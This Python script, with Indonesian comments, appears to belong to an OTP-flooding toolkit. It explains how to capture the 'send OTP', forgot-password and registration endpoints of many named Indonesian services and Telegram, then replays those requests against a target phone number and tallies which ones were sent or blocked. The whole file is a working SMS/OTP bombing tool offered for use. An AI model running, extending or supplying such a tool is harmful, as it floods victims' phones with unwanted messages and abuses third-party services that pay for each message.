"""
ENDPOINT FINDER TOOL - OTP Indonesia
Buka website, inspect network, cari endpoint "send OTP" / "lupa password" / "daftar",
lalu masukkan endpoint & payload di sini. Tools akan test langsung.

CARA PAKAI:
1. Buka website brand (via browser)
2. Buka Inspect Element > Network tab
3. Klik "Lupa Password" / "Daftar" / masukin nomor HP
4. Cari request POST/GET ke endpoint yang ngirim OTP
5. Copy request details ke sini (method, URL, headers, payload)
6. Jalankan -> tools test apakah endpoint tersebut kirim OTP ke nomor target
"""

import requests
import json
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
from modules.otp_flood.sender_trigger import OTPTrigger

TARGET = input("Nomor target (contoh: 62812xxx): ") or "6281234567890"


def test_custom_endpoint(name, url, method="POST", payload=None, headers=None, phone_field="phone"):
    """
    Test endpoint kustom.
    
    Args:
        name: Nama brand
        url: Endpoint URL (dari inspect network)
        method: HTTP method (POST/GET)
        payload: JSON/dict yang dikirim (dari inspect network)
        headers: HTTP headers (dari inspect network)
        phone_field: Nama field untuk nomor HP di payload
    """
    print(f"\n[*] Testing: {name}")
    print(f"    URL: {url}")
    print(f"    Method: {method}")
    
    # Replace phone number in payload
    if payload:
        payload_str = json.dumps(payload)
        # Find phone placeholder and replace
        for key, val in payload.items():
            if isinstance(val, str) and ("phone" in key.lower() or "hp" in key.lower() or "telp" in key.lower() or val == "PHONE"):
                payload[key] = TARGET if not TARGET.startswith("0") else "0" + TARGET[2:]
        
        print(f"    Payload: {payload}")
    
    if headers:
        print(f"    Headers: {json.dumps(headers, indent=4)}")
    
    try:
        if method.upper() == "POST":
            r = requests.post(url, json=payload, headers=headers, timeout=10)
        else:
            r = requests.get(url, params=payload, headers=headers, timeout=10)
        
        print(f"    Status: {r.status_code}")
        print(f"    Response: {r.text[:150]}")
        
        if r.status_code in (200, 201):
            return "sent"
        elif r.status_code in (429, 403):
            return "blocked"
        else:
            return "error"
    except Exception as e:
        print(f"    Error: {e}")
        return "error"


def show_instructions():
    """Menampilkan panduan cara mendapatkan endpoint."""
    print("""
╔═══════════════════════════════════════════════════════════════╗
║           CARI ENDPOINT OTP BARU                             ║
╚═══════════════════════════════════════════════════════════════╝

LANGKAH-LANGKAH:
1. Buka website https://www.[nama-brand].co.id
2. Buka Developer Tools (F12) > Network tab
3. Filter: XHR / Fetch (biar gak lihat gambar/css/js)
4. Klik 'Lupa Password' atau 'Daftar' atau 'Masuk'
5. Masukkan nomor HP lalu klik 'Kirim OTP' / 'Dapatkan Kode'
6. Di Network tab, cari request baru yang muncul
7. Lihat:
   - Request URL (biasanya mengandung: otp, send, code, verify, password)
   - Request Method (POST/GET)
   - Request Headers (terutama Content-Type, Cookie, Origin, Referer)
   - Request Payload (field yang dikirim, biasanya ada 'phone' / 'mobile' / 'no_hp')

CONTOH BRAND YANG BISA DICARI:
- Traveloka (traveloka.com)
- Tiket.com
- Bibit (bibit.id)
- Ajaib (ajaib.co.id)
- Halodoc (halodoc.com)
- Vidio (vidio.com)
- Tokopedia (tokopedia.com)
- Bukalapak (bukalapak.com)
- Blibli (blibli.com)
- Sociolla (sociolla.com)
- PasarPolis (pasarPolis.com)
- Rumah123 (rumah123.com)
- Alfagift (alfagift.id)
- myPertamina (mypertamina.id)
- Indomaret (klikindomaret.com)
- Jobstreet (jobstreet.co.id)
- Kitabisa (kitabisa.com)
- Ruangguru (ruangguru.com)
- Bahaso (bahaso.com)
- Cakap (cakap.com)
- Berrybenka (berrybenka.com)
- Zalora (zalora.co.id)
- Ralali (ralali.com)
- Bukareview (bukareview.com)
- Dan masih banyak lagi...

SETELAH DAPAT, KIRIM KE GUE:
Format: nama_brand|METHOD|URL|{payload_json}|{headers_json}|phone_field
Contoh: telegram|POST|https://my.telegram.org/auth/send_password|{"phone":"+62xxx"}|{}|phone
""")


if __name__ == "__main__":
    show_instructions()
    
    # Test endpoints yang udah kita punya (yang verified / perlu update)
    print("\n\n=== TEST ENDPOINT YANG UDAH ADA ===")
    t = OTPTrigger(TARGET)
    for key in t.BRANDS:
        res = t.trigger(key)
        ico = "✅" if res == "sent" else "🔴" if res == "blocked" else "❌"
        print(f"  {ico} {key}: {res}")
    
    # Interactive mode: user kasih endpoint baru
    print("\n\n=== MASUKKAN ENDPOINT BARU ===")
    print("(Ketik 'q' untuk selesai)")
    while True:
        inp = input("\nEndpoint format (nama|POST|URL|{}|{}): ").strip()
        if inp.lower() == 'q':
            break
        
        parts = inp.split("|")
        if len(parts) < 3:
            print("Format: nama|METHOD|URL|payload_json|headers_json")
            continue
        
        name = parts[0]
        method = parts[1].upper()
        url = parts[2]
        payload = {}
        headers = {}
        
        if len(parts) >= 4 and parts[3].strip():
            try: payload = json.loads(parts[3])
            except: payload = {"phone": "PHONE"}
        if len(parts) >= 5 and parts[4].strip():
            try: headers = json.loads(parts[4])
            except: pass
        
        test_custom_endpoint(name, url, method, payload, headers)
